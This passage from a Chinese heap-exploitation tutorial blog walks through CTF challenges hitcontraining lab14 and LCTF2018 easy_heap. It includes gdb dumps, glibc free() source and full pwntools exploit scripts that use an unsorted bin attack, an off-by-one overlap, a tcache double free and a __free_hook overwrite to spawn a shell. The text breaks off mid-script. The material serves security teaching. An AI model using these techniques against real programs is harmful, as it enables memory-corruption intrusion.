title="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/">2018-hitcon-baby-tcache_writeup<i class="fa fa-external-link"></i></span></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/63c0a3ee/">https://noone-hub.github.io/posts/63c0a3ee/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程7</title>
    <url>/posts/f37fbe7f/</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程7"><a href="#pwn堆入门系列教程7" class="headerlink" title="pwn堆入门系列教程7"></a>pwn堆入门系列教程7</h1><p>本文首发于先知社区</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjA4Nw==" title="https://xz.aliyun.com/t/6087">pwn堆入门系列教程1<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjE2OQ==" title="https://xz.aliyun.com/t/6169">pwn堆入门系列教程2<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjI1Mg==" title="https://xz.aliyun.com/t/6252">pwn堆入门系列教程3<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjMyMg==" title="https://xz.aliyun.com/t/6322">pwn堆入门系列教程4<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjM3Nw==" title="https://xz.aliyun.com/t/6377">pwn堆入门系列教程5<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQwNg==" title="https://xz.aliyun.com/t/6406">pwn堆入门系列教程6<i class="fa fa-external-link"></i></span></p><p>先学习 Unsorted Bin Attack，这部分由于ctf-wiki题目较少，所以只练习了一道题<br>Large bin也没有题目，到时候遇到在进行学习</p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="hitcontraining-lab14"><a href="#hitcontraining-lab14" class="headerlink" title="hitcontraining_lab14"></a>hitcontraining_lab14</h2><p>这个题过程也比较简单，自己复现下就好</p><h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>因为现在都是tcache了，所以复现起来还是得拿老版本libc测试</p><p>这里可以看出bk已经被修改</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x9ce0d0-0xd0</span><br><span class="line">0x9ce000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x9ce010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce020:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x9ce030:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x9ce040:	0x0000000a61646164	0x00000000006020b0</span><br><span class="line">0x9ce050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0c0:	0x0000000000000090	0x0000000000000031</span><br><span class="line">0x9ce0d0:	0x0000000a33333333	0x0000000000000000</span><br><span class="line">0x9ce0e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce0f0:	0x0000000000000000	0x0000000000020f11</span><br><span class="line">0x9ce100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x9ce180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>这里可以看到magic被修改了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/20gx 0x00000000006020b0+0x10</span><br><span class="line">0x6020c0 &lt;magic&gt;:	0x00007ff41afe4b78	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray&gt;:	0x00000000009ce010	0x00000000009ce040</span><br><span class="line">0x6020f0 &lt;heaparray+16&gt;:	0x00000000009ce0d0	0x0000000000000000</span><br><span class="line">0x602100 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602110 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602120 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure><p>拿到flag了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x1a bytes:</span><br><span class="line">    <span class="string">'flag&#123;unsorted_bin_attack&#125;\n'</span></span><br><span class="line">flag&#123;unsorted_bin_attack&#125;</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'magicheap'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'magicheap'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_heap</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_heap</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"1111"</span>)  <span class="comment"># 0</span></span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"2222"</span>)  <span class="comment"># 1</span></span><br><span class="line">    <span class="comment"># in order not to merge into top chunk</span></span><br><span class="line">    create_heap(<span class="number">0x20</span>, <span class="string">"3333"</span>)  <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    del_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    magic = <span class="number">0x00000000006020C0</span></span><br><span class="line">    fd = <span class="number">0</span></span><br><span class="line">    bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    edit_heap(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">    create_heap(<span class="number">0x80</span>, <span class="string">"dada"</span>)  <span class="comment">#trigger unsorted bin attack</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    io.sendline(<span class="string">"4869"</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><p>unsortbin attack通常用于修改循环次数以及global_max_fast从而任意大小chunk可以fastbin attack</p><p>然后开始学习tcache</p><h2 id="LCTF2018-PWN-easy-heap"><a href="#LCTF2018-PWN-easy-heap" class="headerlink" title="LCTF2018 PWN easy_heap"></a>LCTF2018 PWN easy_heap</h2><p>我感觉这道题质量挺高的，对于我这个新手来说，他用了挺多内存分配的知识，让我好好补了一波，这道题功能分析以及漏洞点分析请看ctf-wiki tcache篇</p><p>我直接讲解漏洞利用过程</p><h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>这道题麻烦就麻烦在没法直接溢出覆盖pre_size，所以要巧妙的构造pre_size，最终在overlap，后面的就是常规操作了</p><p>具体过程是跟ctf-wiki一样<br>具体过程：</p><ol><li>将 A -&gt; B -&gt; C 三块 unsorted bin chunk 依次进行释放</li><li>A 和 B 合并，此时 C 前的 prev_size 写入为 0x200</li><li>A 、 B 、 C 合并，步骤 2 中写入的 0x200 依然保持</li><li>利用 unsorted bin 切分，分配出 A</li><li>利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200</li><li>将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针</li><li>此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： A (free) -&gt; B (allocated) -&gt; C (free)，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。</li><li>tips: 但是在这个过程中需要注意 tcache 的影响。</li></ol><h4 id="堆初始化操作部分"><a href="#堆初始化操作部分" class="headerlink" title="堆初始化操作部分"></a>堆初始化操作部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="堆块重新排列"><a href="#堆块重新排列" class="headerlink" title="堆块重新排列"></a>堆块重新排列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#tcache for avoid top chunk consolidate</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># tcache-0</span></span><br><span class="line"><span class="comment"># tcache-1</span></span><br><span class="line"><span class="comment"># tcache-2</span></span><br><span class="line"><span class="comment"># tcache-3</span></span><br><span class="line"><span class="comment"># tcache-4</span></span><br><span class="line"><span class="comment"># tcache-5</span></span><br><span class="line"><span class="comment"># unsorted - 6</span></span><br><span class="line"><span class="comment"># unsorted - 7</span></span><br><span class="line"><span class="comment"># unsorted - 8</span></span><br><span class="line"><span class="comment"># tcache-9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i)*<span class="number">0x7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">7</span>)*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-1</span></span><br><span class="line"><span class="comment"># chunk - 7</span></span><br><span class="line"><span class="comment"># chunk - 8</span></span><br><span class="line"><span class="comment"># chunk - 9</span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br></pre></td></tr></table></figure><h4 id="off-by-one覆盖造成overlap"><a href="#off-by-one覆盖造成overlap" class="headerlink" title="off-by-one覆盖造成overlap"></a>off-by-one覆盖造成overlap</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># now chunk -9's pre_size is 0x200</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, str(<span class="number">8</span>)*<span class="number">0x7</span>) <span class="comment">#off-by-one change chunk9's insue</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># free into tcache, so we can use unsortbin consolidate</span></span><br><span class="line">free(<span class="number">9</span>) <span class="comment"># unsortbin consolidate</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，off-by-one这里要覆盖到inuse的话，是得申请0xf8大小，malloc(0xf8)后，</p><ol><li>它会重用下个堆快的pre_size作为数据块</li><li>所以我们off-by-one才能覆盖到insue位<br>他会在ptr[0xf8]=0;这里就将size处的insue变成0<br>然后此时tcache还没满，所以free(6)让tcache填满后，才能用触发unsortbin合并</li></ol><h4 id="申请0xf8-让剩余的unsortbin对齐到第0块chunk"><a href="#申请0xf8-让剩余的unsortbin对齐到第0块chunk" class="headerlink" title="申请0xf8,让剩余的unsortbin对齐到第0块chunk"></a>申请0xf8,让剩余的unsortbin对齐到第0块chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># now the heap </span></span><br><span class="line"><span class="comment"># chunk-6   tcache</span></span><br><span class="line"><span class="comment"># chunk-5   tcache</span></span><br><span class="line"><span class="comment"># chunk-4   tcache</span></span><br><span class="line"><span class="comment"># chunk-3   tcache</span></span><br><span class="line"><span class="comment"># chunk-2   tcache</span></span><br><span class="line"><span class="comment"># chunk-1   tcache</span></span><br><span class="line"><span class="comment"># chunk - 7 unsorted     7-9 consolidate, and 8 in the big free_chunk</span></span><br><span class="line"><span class="comment"># chunk - 8 use          this is the overlap</span></span><br><span class="line"><span class="comment"># chunk - 9 unsorted</span></span><br><span class="line"><span class="comment"># chunk-0   tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">0x10</span>, str(i+<span class="number">1</span>)*<span class="number">0x7</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line"></span><br><span class="line">puts(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这时候我们puts(0)就可以泄露了，</p><h4 id="后面简单的double-free"><a href="#后面简单的double-free" class="headerlink" title="后面简单的double free"></a>后面简单的double free</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_leak = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">io.success(<span class="string">"libc_leak: 0x%x"</span> % libc_leak)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">malloc(<span class="number">0x10</span>, str(<span class="number">0x9</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># now the heap</span></span><br><span class="line"><span class="comment"># chunk-1 </span></span><br><span class="line"><span class="comment"># chunk-2</span></span><br><span class="line"><span class="comment"># chunk-3</span></span><br><span class="line"><span class="comment"># chunk-4</span></span><br><span class="line"><span class="comment"># chunk-5</span></span><br><span class="line"><span class="comment"># chunk-6</span></span><br><span class="line"><span class="comment"># chunk-8 </span></span><br><span class="line"><span class="comment"># chunk-0 chunk-9</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># chunk-7</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#bypass the tcache count check</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">9</span>) <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f2c5</span> </span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span><span class="comment"># 0x10a38c</span></span><br><span class="line">malloc(<span class="number">0x10</span>, p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh;#'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line">io.success(<span class="string">"free_hook: 0x%x"</span> % free_hook)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里有个注意的地方，free(1)这里看好</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">4194</span>    ------------------------------ <span class="built_in">free</span> ------------------------------</span><br><span class="line"><span class="number">4195</span>  */</span><br><span class="line"><span class="number">4196</span> </span><br><span class="line"><span class="number">4197</span> <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line"><span class="number">4198</span> _int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line"><span class="number">4199</span> &#123;</span><br><span class="line"><span class="number">4200</span>   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4201</span>   mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line"><span class="number">4202</span>   mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line"><span class="number">4203</span>   INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="number">4204</span>   <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line"><span class="number">4205</span>   INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line"><span class="number">4206</span>   mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4207</span>   mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"><span class="number">4208</span> </span><br><span class="line"><span class="number">4209</span>   size = chunksize (p);</span><br><span class="line"><span class="number">4210</span> </span><br><span class="line"><span class="number">4211</span>   <span class="comment">/* Little security check which won't hurt performance: the</span></span><br><span class="line"><span class="comment">4212      allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">4213      Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">4214      here by accident or by "design" from some intruder.  */</span></span><br><span class="line"><span class="number">4215</span>   <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line"><span class="number">4216</span>       || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line"><span class="number">4217</span>     malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"><span class="number">4218</span>   <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">4219      multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="number">4220</span>   <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line"><span class="number">4221</span>     malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"><span class="number">4222</span> </span><br><span class="line"><span class="number">4223</span>   check_inuse_chunk(av, p);</span><br><span class="line"><span class="number">4224</span> </span><br><span class="line"><span class="number">4225</span> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="number">4226</span>   &#123;</span><br><span class="line"><span class="number">4227</span>     <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"><span class="number">4228</span> </span><br><span class="line"><span class="number">4229</span>     <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line"><span class="number">4230</span>     tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"><span class="number">4231</span> </span><br><span class="line"><span class="number">4232</span>     <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">4233        trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">4234        2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence</span></span><br><span class="line"><span class="comment">4235        before aborting.  */</span></span><br><span class="line"><span class="number">4236</span>     <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))</span><br><span class="line"><span class="number">4237</span>       &#123;</span><br><span class="line"><span class="number">4238</span>         tcache_entry *tmp;</span><br><span class="line"><span class="number">4239</span>         LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line"><span class="number">4240</span>         <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"><span class="number">4241</span>              tmp;</span><br><span class="line"><span class="number">4242</span>              tmp = tmp-&gt;next)</span><br><span class="line"><span class="number">4243</span>           <span class="keyword">if</span> (tmp == e)</span><br><span class="line"><span class="number">4244</span>             malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line"><span class="number">4245</span>         <span class="comment">/* If we get here, it was a coincidence.  We've wasted a few</span></span><br><span class="line"><span class="comment">4246            cycles, but don't abort.  */</span></span><br><span class="line"><span class="number">4247</span>       &#125;</span><br><span class="line"><span class="number">4248</span> </span><br><span class="line"><span class="number">4249</span>     <span class="keyword">if</span> (tcache</span><br><span class="line"><span class="number">4250</span>         &amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line"><span class="number">4251</span>         &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line"><span class="number">4252</span>       &#123;</span><br><span class="line"><span class="number">4253</span>         tcache_put (p, tc_idx);</span><br><span class="line"><span class="number">4254</span>         <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4255</span>       &#125;</span><br><span class="line"><span class="number">4256</span>   &#125;</span><br><span class="line"><span class="number">4257</span> <span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>源码在最后一部分检查了tcache的数量，所以free的时候得使tcache的数量对的上。</p><p>说多了都是泪，简单题做着不简单，花了好长时间</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/NoOne/Documents/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"&gt; "</span>, 